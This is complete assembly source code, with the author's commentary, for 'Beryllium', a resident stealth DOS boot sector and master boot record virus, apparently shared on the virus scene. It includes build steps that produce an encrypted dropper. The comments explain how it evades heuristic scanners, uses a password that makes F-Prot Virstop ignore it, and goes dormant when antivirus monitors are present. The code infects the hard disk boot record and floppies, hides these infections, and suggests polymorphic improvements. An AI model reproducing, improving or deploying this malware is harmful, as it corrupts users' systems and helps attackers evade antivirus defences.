;                   ---------------------------------------
;                   BERYLLIUM: A Research Boot Sector Virus  
;                   ---------------------------------------
;
;Interesting features:
;--------------------

;1. The virus places only a small amount of benign code (no int13 writes) in 
;the floppy boot sector or hard disk master boot record, just enough to load 
;the remainder of the virus located in a sector elsewhere on the disk.  This 
;allows the virus to completely avoid detection by heuristic A-V scanners even 
;when it is not resident in memory and providing stealth.  It also greatly 
;limits the area of the viral code which may be used for anti-viral scan 
;strings. 

;2. The installed virus will not trigger the F-Prot Virstop resident boot 
;sector virus alarm due to a Virstop "password" (7878h) located at installed 
;virus offset 102h.  Because of it, Virstop simply ignores the presence of the 
;virus in memory.  This feature of Virstop was probably implemented to prevent 
;the program from falsely alerting on some commonly used TSR which installs at 
;the top of conventional memory and which has a virus-like heuristic 
;signature.  FYI, here is a list of items that Virstop looks for at the top of 
;conventional memory to detect resident boot sector viruses: 

;       a. An aa55h valid-boot-record tag.
;       b. 0413h, the offset of the system memory size value in the BIOS data 
;          table. 
;       c. int13's segment pointing to just beyond the amount of conventional 
;          memory indicated by the BIOS data table value at 0:0413h. 
;       d. cd13h ("int13"). 

;If any two of these checks are positive, Virstop sounds the alarm.  However, 
;if the code string 7878h is present at (0:413h)*40h+102h, Virstop doesn't 
;even check for these virus characteristics. 

;3. The virus will not infect floppies if int40h has been stolen (i.e. direct 
;disk writes are being monitored by an A-V activity monitor via int13's "back 
;door").  The dropper contains the same feature for MBR infection.  This, when 
;combined with the virus' MBR, boot sector and Virstop stealth, makes the 
;virus very difficult to detect.  Considering the very small number of 
;infection opportunities which would be missed using this passive approach 
;and the tiny amount of code (7-11 bytes) that is required to implement it, it 
;is probably the best method to use in the resident portion of boot sector 
;viruses to achieve extreme stealth. 
 
;4. The dropper will not re-infect a system which has been infected and then 
;cleaned.  This makes the task of locating the dropper file impossible if the 
;attempt is made on a machine that it has previously infected.  As a result, 
;the dropper file cannot be submitted to more knowledgeable parties for A-V 
;analysis and could still be inadvertently transferred to another system from 
;the previously infected system.  Boots from infected floppies will always 
;infect a clean system, even if it has been previously infected.

;5. Only very light encryption of the dropper was implemented using a method 
;that is not recognized as encryption by current heuristic scanners.  
;Executable-file encryption programs available in the public domain provide 
;far better protection for dropper files since their decryption code will not 
;(and must not) be recognized as hostile by anti-viral scanners and their 
;encryption methods are sophisticated. 

;6. The virus does not relocate the entire floppy boot sector.  Instead, the 
;small amount of boot sector code replaced by the viral code is stored in the 
;second part (main body) of the virus.  This is restored in memory by the 
;virus during the boot sequence, allowing the original boot sector to execute 
;normally.  This feature leads to the benefits mentioned in #9 below.

;7. Stealth is achieved for floppies by restoring the original boot sector 
;code fragment to the boot sector image in the disk I/O buffer and for the MBR 
;by the usual means of redirecting MBR reads to the relocation sector. 

;8. When the main body of the virus is written to the last sector of the 
;floppy root directory, it is written at the end of the sector and leading 
;zeros are written to the beginning of the sector.  This prevents garbage file
;names from appearing immediately after the infection of disks with full or 
;nearly full root directories, decreasing the probability of detection. 

;9. The placement of the virus' main body at the end of the root directory is 
;preferable to placing it elsewhere on the disk.  The infection process is 
;completely silent because no floppy head movement is required and produces no 
;noticeable delay for the same reason.  Beryllium uses only the last sector of 
;the root directory because it does not need to relocate the original boot 
;sector (as mentioned in #6 above).  Since the odds of coming across a disk 
;with a full root directory are slim, little is gained by locating a single-
;sector boot virus elsewhere on the floppy while a quite a bit of stealth is 
;lost. 

;10. The floppy infection (read-write-write) sequence of the virus is 
;optimized to require only a single media rotation.  This reduces to an 
;absolute minimum the system response delay during a floppy infection, thereby 
;maximizing stealth. 

;Possible improvements:
;---------------------

;1. A version of the dropper which attaches itself to .EXE files.  The 
;infected .EXE file would drop the boot sector virus but would not infect 
;other executable files.  This would make the dropper less obvious than it
;is in its current stand-alone file configuration.

;2. Direct port writes to the hard drive controller by the dropper file to 
;infect the fixed disk MBR.

;3. Variable code for the loading of the virus' main body in order to avoid
;detection via scan strings.  The polymorphic code generator required would 
;be in the dropper only, preventing algorithmic analysis and countermeasures
;until a sample copy of the actual dropper was obtained.

;4. Installation of the virus in places other than the top of conventional 
;memory and without detectable memory use.

;It's highly unlikely that I will be the one to implement any of the above 
;improvements since I am getting fairly bored with the whole virus scene.  
;Virus BBSs are becoming extinct with most of the really good ones already 
;gone.  As a result, very few people will ever see and appreciate any virus
;that is uploaded.  So, why bother?

;I've only one more small project in mind, after which I'll concentrate on 
;learning the C language. 

;============================================================================= 
; Virus Name:  Beryllium 
; 
;      Notes:  
;             - resident, stealth, boot sector/MBR infector 
;             - places only 22 bytes of benign code in a boot sector or MBR 
;               thereby totally avoiding heuristic alarms even when the virus 
;               is not resident 
;             - resident virus not detected by F-Prot Virstop due to a
;               "password" located at installed virus offset 102h 
;             - detects the presence of A-V monitors and deactivates while
;               present 
;             - MBR and floppy boot sector stealth 
;             - post-infection MBR write protection 
;             - functionally infects all floppy formats in drives A and B 
; 
; To Compile: 
;             - use A86 assembler 
;             - type "a86 berylium.a86" 
;             - run the berylium.com file
;             - encrypted dropper is produced as "dropbery.com" 
;             - if you desire to infect your system, run dropbery.com
;============================================================================= 

boot            equ     06ad            ;delta offset for boot location
drop            equ     041             ;delta offset for drop of virus
res             equ     0153            ;delta offset for resident location
oldlength       equ     016             ;infection code length (boot sector)
virus_tag1      equ     0c033           ;infection tag (main body code)
virus_tag2      equ     0ea             ;infection tag (boot sector code)

;-----------------------------------------------------------------------------
; Encrypt - encrypts dropper and creates dropper file
;-----------------------------------------------------------------------------

encrypt:
        mov     bx,offset dropper       ;starting point for encryption
        mov     cl,04                   ;set shift/rotate count

scramble_it:
        mov     ax,[bx]                 ;move target word into ax     
        rol     ax,cl                   ;rotate word left "cl" positions
        mov     [bx],ax                 ;move word back to memory
        inc     bx                      ;point to next byte 
        cmp     bx,offset MBR_buffer-2  ;end of code to encrypt?
        jbe     scramble_it             ;if not, do it again

        mov     ah,03c                  ;create file function
        xor     cx,cx                   ;attribute = 0 = read/write
        mov     dx,offset file_name     ;point to ASCIIZ file name string
        int     021                     ;create file
        jc      exit_encrypt            ;if flag=fail, exit

        mov     bx,ax                   ;load bx with new file's handle

        mov     ah,040                  ;write to file with handle
        mov     cx,droplength           ;number of bytes to write
        mov     dx,offset decrypt       ;pointer to data to write
        int     021                     ;write encrypted dropper
        jc      exit_encrypt            ;if flag=fail, exit

        mov     ah,03e                  ;close file
        int     021
       
exit_encrypt:
        mov     ax,04c00                ;terminate w/return code
        int     021                     ;terminate program

file_name       db "dropbery.com",0     ;ASCIIZ dropper file name

;-----------------------------------------------------------------------------
; Decrypt - decrypts dropper using a method not currently recognized as 
; hostile by heuristic scanners 
;-----------------------------------------------------------------------------

decrypt:
        mov     bx,offset MBR_buffer-drop-2 ;starting point for decryption
        mov     cl,04                   ;set shift/rotate count

unscramble_it:
        mov     ax,[bx]                 ;move target word into ax       
        ror     ax,cl                   ;rotate word right "cl" positions
        mov     [bx],ax                 ;move word back to memory       
        dec     bx                      ;point to next byte
        cmp     bx,offset dropper-drop  ;end of code to decrypt?
        jae     unscramble_it           ;if not, do it again

;-----------------------------------------------------------------------------
; Dropper - infects MBR if not already infected and if no A-V monitor program 
; is present
;-----------------------------------------------------------------------------

dropper:
        push    ds                      ;preserve ds

        xor     ax,ax                   ;zero ax
        mov     ds,ax                   ;point data seg. to interrupt vector
                                        ; table
        cmp     byte ptr [040*4+3],0c0  ;int40 segment pointing to ROM?
        pop     ds                      ;restore ds
        jb      exit_dropper            ;if not, do not attempt to infect MBR

        mov     ah,035                  ;load ah with installation check byte
        int     013                     ;check for installed virus
        cmp     al,ah                   ;al = ah?
        je      exit_dropper            ;if so, already installed, so MBR must
                                        ; already be infected
drop_it:
        mov     ax,0201                 ;select read-one-sector function
        mov     bx,offset MBR_buffer-drop ;set load offset
        mov     cx,02                   ;cylinder 0, sector 2
        mov     dx,080                  ;fixed disk 0 (C)
        int     013                     ;load to buffer
        jc      exit_dropper            ;if flag=fail, exit

        cmp     word ptr [bx+070],virus_tag1 ;beryllium code present?
        je      exit_dropper                 ;if so, exit dropper             
        
        mov     cx,virlength            ;set move count
        mov     si,offset beryllium-drop ;set source address of virus code    
        lea     di,[bx+070]             ;set destination within buffer
        rep     movsb                   ;infect sector in memory

        mov     ax,0301                 ;write infected sector to
        mov     cl,02                   ; cylinder 0, sector 2
        int     013
        jc      exit_dropper            ;if flag=fail, exit

        mov     ax,0201                 ;read original MBR
        dec     cx                      ; from cylinder 0, sector 1
        int     013
        jc      exit_dropper            ;if flag=fail, exit

        mov     ax,0301                 ;write original MBR
        mov     cl,03                   ; to cylinder 0, sector 3
        int     013                     
        jc      exit_dropper            ;if flag=fail, exit

        mov     byte ptr [offset head-drop],dh   ;save location (head &     
        mov     byte ptr [offset sector-drop],02 ; sector) of virus in MBR's
                                                 ;  viral bootstrap code    
        mov     cx,oldlength            ;set number of bytes to move
        mov     si,offset newbytes-drop ;set source address of infection code
        mov     di,bx                   ;set destination to MBR in memory 
        cld                             ;clear direction flag (fwd)
        rep     movsb                   ;infect MBR with bootstrap code

        mov     ax,0301                 ;write infected MBR to
        inc     cx                      ; cylinder 0, sector 1
        int     013 

exit_dropper:
        mov     ax,04c00                ;terminate w/return code
        int     021                     ;terminate program

;-----------------------------------------------------------------------------
; Beryllium - main body of virus, executes at boot, infects MBR if boot is 
; from floppy and MBR is not infected, installs virus in memory if not 
; installed
;-----------------------------------------------------------------------------

beryllium:
        xor     ax,ax                   ;zero ax
        mov     ds,ax                   ;set ds = 0
 
        cli                             ;clear interrupts
        mov     ss,ax                   ;set ss = 0
        mov     bx,07c00                ;set bx to boot code offset
        mov     sp,bx                   ;ditto for sp
        sti                             ;set interrupts

        cmp     dl,080                  ;is this a hard drive boot?
        jne     floppy_boot             ;if not, jump to check/infect MBR

        mov     ax,0201                 ;if so, load orignal MBR to 7c00h
        mov     cx,03                   ;cylinder 0, sector 3
        int     013                     ;do it

        jmp     short install           ;install virus in memory

floppy_boot:
        mov     si,offset oldbytes+boot ;load source offset of original bytes
        mov     di,07c3e                ;load destination in boot sector code
        mov     cx,oldlength            ;set number of bytes to move
        push    cx                      ;save it for later
        cld                             ;clear direction (fwd)
        rep     movsb                   ;restore original bytes to boot sector
                                        ;in memory
        mov     ax,0201                 ;select read-one-sector function
        mov     bh,06                   ;set load offset
        inc     cx                      ;cylinder 0, sector 1 (MBR)
        mov     dx,080                  ;fixed disk 0 (C)
        int     013                     ;load MBR to 0:0600h

        cmp     byte ptr [0611],virus_tag2 ;MBR infected?
        je      install                    ;if so, install virus in memory
        
        mov     ax,0301                 ;if not, save orig. MBR
        mov     cx,03                   ;at cylinder 0, sector 3
        int     013                     ;write MBR

        mov     byte ptr [offset head+boot],dh   ;save location (head &     
        mov     byte ptr [offset sector+boot],02 ; sector) of virus in MBR's
                                                 ;  viral bootstrap code    
        pop     cx                      ;set number of bytes to move
        mov     si,offset newbytes+boot ;set source address of infection code
        mov     di,bx                   ;set destination to MBR in memory 
        rep     movsb                   ;infect MBR

        mov     ax,0302                 ;select write-two-sectors function
        inc     cx                      ;cylinder 0, sector 1
        int     013                     ;write infected MBR to sector 1 and
                                        ;continuation of virus to sector 2
install:
        mov     ah,035                  ;load ah with installation check byte
        int     013                     ;check for installed virus
        cmp     al,ah                   ;al = ah?
        je      exec_boot               ;if so, already installed, so jump to
                                        ; execute boot code in memory
        dec     word ptr [0413]         ;lower top-of-mem by 1KB
        int     012                     ;get conventional memory count in #KB

        mov     cx,0106                 ;load move and shift values
        shl     ax,cl                   ;calculate segment for virus residence

        mov     es,ax                   ;load es with destination segment
        xchg    [013*4+2],ax            ;steal int13 segment
        mov     [offset old13+boot+2],ax ;store original segment in virus
        mov     ax,offset int13-res     ;load res. off. of virus int13 
        xchg    [013*4],ax              ;steal int13 offset
        mov     [offset old13+boot],ax  ;store original offset in virus

        mov     si,0870                 ;set source offset
        mov     di,0070                 ;set destination offset
        rep     movsw                   ;move virus to es:0h (9fc0:0000h in 
                                        ; system w/640K conventional memory)
exec_boot:
        jmp     0000:07c00              ;execute boot code

;-----------------------------------------------------------------------------
; Int13 - responds to installation check from dropper and boot routines, 
; provides MBR stealth and write-protection, infects floppy if not already
; infected and if no A-V monitor is present, provides floppy stealth
;-----------------------------------------------------------------------------

chain_int13:
        pop     ds                      ;restore registers
        pop     di
        pop     si
        jmp     short virstop         
        db      078,078                 ;Virstop "password"

virstop:
        db      0ea                     ;"jmp far" to location specified in
                                        ; old13
old13   dw      ?, ?                    ;offset and segment of original int13
                                        ; handler
int13:
        cmp     ah,035                  ;installation check?
        jne     MBR_stealth             ;if not, continue
        mov     al,ah                   ;if so, put ah in al for confirmation
        iret                            ; and return

MBR_stealth:
        push    si                      ;preserve registers
        push    di
        push    ds

        cmp     cx,01                   ;track 0, sector 1?
        jne     chain_int13             ;if not, we're not interested

        cmp     dx,080                  ;head 0, fixed disk 0?
        ja      chain_int13             ;if above, exit
        jb      infect_floppy           ;if below, must be floppy access

        cmp     ah,03                   ;write to fixed disk MBR?
        je      sim_IO                  ;if so, simulate write

        mov     cl,03                   ;point to relocated original MBR 
        call    bios_int13              ;load it to disk I/O buffer
        mov     cl,01                   ;restore cl to point to sector 1

sim_IO:
        xor     ah,ah                   ;clear ah and carry flag to simulate
        clc                             ; succcessful write

exit_int13:
        pop     ds                      ;restore registers
        pop     di
        pop     si

        retf    02                      ;return to calling routine

infect_floppy:
        cmp     ah,02                   ;read request?
        jne     chain_int13             ;if not, exit

        cmp     dl,01                   ;floppy drive 'A' or 'B'?
        ja      chain_int13             ;if not, exit

        call    bios_int13              ;read boot sector
        jc      exit_int13              ;if flag=fail, exit to retry

        cmp     byte ptr es:[bx+04f],virus_tag2 ;boot sector infected?
        je      floppy_stealth                  ;if so, hide infection

        xor     cx,cx                   ;zero cx
        mov     ds,cx                   ;point ds to system vector table

        cmp     byte ptr [040*4+3],0c0  ;int40 pointing to ROM?
        jb      floppy_stealth          ;if not, do not infect boot sector

        push    bx                      ;preserve registers
        push    es

        push    es
        pop     ds                      ;set ds = es 

        push    cs
        pop     es                      ;set es = cs

        lea     si,[bx+03e]             ;set source offset to boot sector
        mov     di,offset oldbytes-res  ;set destination to code storage
        mov     cx,oldlength            ;set number of bytes to move/save
        push    cx                      ;save that number for later
        cld                             ;clear direction flag (fwd)
        rep     movsb                   ;store original boot code in virus

        mov     [bx],03ceb              ;put jump at start of boot code

        mov     al,byte ptr [bx+016]    ;load # sectors/FAT from BPB
        mul     byte ptr [bx+010]       ;multiply by number of FATs
        inc     ax                      ;add boot sector to count
        push    ax                      ;save it for later
        mov     ax,[bx+011]             ;load max. # of files from BPB
        mov     cl,04                   ;divide by 16 to get # of root
        shr     ax,cl                   ; directory sectors
        pop     cx                      ;pop boot sector + FAT sector count
        add     cx,ax                   ;add # of directory sectors
        sub     cx,[bx+018]             ;subtract # of sectors per track
                                        ; to get target sector number
        inc     dh                      ;specify head 1
        mov     cs:byte ptr [offset head-res],dh   ;set newbytes head/sector
        mov     cs:byte ptr [offset sector-res],cl ; values to point to virus

        mov     ax,0301                 ;select write-one-sector function
        xor     bx,bx                   ;set offset to point to virus
        call    bios_int13              ;write virus to last root directory
                                        ; sector
        pop     cx                      ;restore registers
        pop     es
        pop     bx

        push    cs
        pop     ds                      ;set ds = cs

        mov     si,offset newbytes-res  ;point to infection code
        lea     di,[bx+03e]             ;set destination to boot sector code
        rep     movsb                   ;infect boot sector in memory

        mov     ax,0301                 ;select write-one-sector function
        inc     cx                      ;track 0, sector 1
        dec     dh                      ;head 0, drive "dl"
        call    bios_int13              ;write infected boot sector
 
floppy_stealth:
        push    cs
        pop     ds                      ;set ds = cs

        mov     si,offset oldbytes-res  ;point to stored original boot code
        lea     di,[bx+03e]             ;set destination to boot sector
        mov     cx,oldlength            ;set number of bytes to move
        cld                             ;clear direction flag (fwd)
        rep     movsb                   ;restore original bytes in memory

        inc     cx                      ;restore cx to 0001h

        jmp     short sim_IO            ;return sanitized boot sector to
                                        ; calling routine
bios_int13:
        pushf                           ;push flags
        cs:
        call    dword ptr [offset old13-res] ;call original int13 handler
        ret                             

;-----------------------------------------------------------------------------
; Newbytes - the only viral code that actually resides in the boot sector or 
; MBR.  Its purpose is simply to load the main body of the virus to 0000:0800 
; and to transfer control to it.  This is the only area that would need to be 
; modified to avoid anti-viral scan string detection.
;-----------------------------------------------------------------------------

newbytes:
        xor     ax,ax                   ;zero ax
        mov     es,ax                   ;set es = 0 
        mov     ax,0201                 ;select read-one-sector function
        mov     bx,0800                 ;set disk I/O buffer offset

        db      0b9                     ;"mov cx,00xx"
sector  db      ?                       ;sector number (xx)
        db      00                      ;track 0 

        db      0b6                     ;"mov dh,xx"
head    db      ?                       ;head number (xx)

        int     013                     ;load virus to 0000:0800h

        jmp     0000:0870               ;jump to execute virus code

oldbytes:
        db      oldlength  dup  ?       ;storage location for original first 
                                        ; 22d bytes of the boot sector
                              
        db      0,0,'BERYLLIUM!',0,0    ;credits

MBR_buffer:

droplength      equ     offset MBR_buffer - offset decrypt
virlength       equ     offset MBR_buffer - offset beryllium
decryptlength   equ     offset MBR_buffer - offset dropper

        end     beryllium
        